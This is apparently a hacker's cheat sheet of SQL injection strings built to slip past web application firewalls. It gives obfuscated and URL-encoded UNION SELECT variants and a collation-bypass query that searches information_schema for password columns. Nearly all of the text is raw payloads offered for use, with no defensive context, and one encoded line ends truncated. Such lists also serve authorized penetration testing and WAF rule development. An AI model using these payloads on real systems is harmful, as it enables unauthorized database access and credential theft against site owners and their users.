## 1. WAF Bypassing Strings:

```sh
/*!%55NiOn*/ /*!%53eLEct*/ %55nion(%53elect 1,2,3)-- - +union+distinct+select+ +union+distinctROW+select+ /**//*!12345UNION SELECT*//**/ concat(0x223e,@@version) concat(0x273e27,version(),0x3c212d2d) concat(0x223e3c62723e,version(),0x3c696d67207372633d22) concat(0x223e,@@version,0x3c696d67207372633d22) concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62​723e) concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22) concat(‘’,@@version,’’) /**//*!50000UNION SELECT*//**/ /**/UNION/**//*!50000SELECT*//**/ /*!50000UniON SeLeCt*/ union /*!50000%53elect*/ +#uNiOn+#sEleCt +#1q%0AuNiOn all#qa%0A#%0AsEleCt /*!%55NiOn*/ /*!%53eLEct*/ /*!u%6eion*/ /*!se%6cect*/ +un/**/ion+se/**/lect uni%0bon+se%0blect %2f**%2funion%2f**%2fselect union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A REVERSE(noinu)+REVERSE(tceles) /*--*/union/*--*/select/*--*/ union (/*!/**/ SeleCT */ 1,2,3) /*!union*/+/*!select*/ union+/*!select*/ /**/union/**/select/**/ /**/uNIon/**/sEleCt/**/ /**//*!union*//**//*!select*//**/ /*!uNIOn*/ /*!SelECt*/ +union+distinct+select+ +union+distinctROW+select+ +UnIOn%0d%0aSeleCt%0d%0a UNION/*&test=1*/SELECT/*&pwn=2*/ un?+un/**/ion+se/**/lect+ +UNunionION+SEselectLECT+ +uni%0bon+se%0blect+ %252f%252a*/union%252f%252a /select%252f%252a*/ /%2A%2A/union/%2A%2A/select/%2A%2A/ %2f**%2funion%2f**%2fselect%2f**%2f union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A /*!UnIoN*/SeLecT+
```

## 2. Union Select by PASS with Url Encoded Method: 

```sh
%55nion(%53elect) union%20distinct%20select union%20%64istinctRO%57%20select union%2053elect %23?%0auion%20?%23?%0aselect %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect %55nion %53eLEct u%6eion se%6cect unio%6e %73elect unio%6e%20%64istinc%74%20%73elect uni%6fn distinct%52OW s%65lect %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7
```

## 3. Illegal mix of Collations ByPass Method: 

```sh
unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name)))

/*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)

union select 1,2,unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name))),4,5 /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)?
```
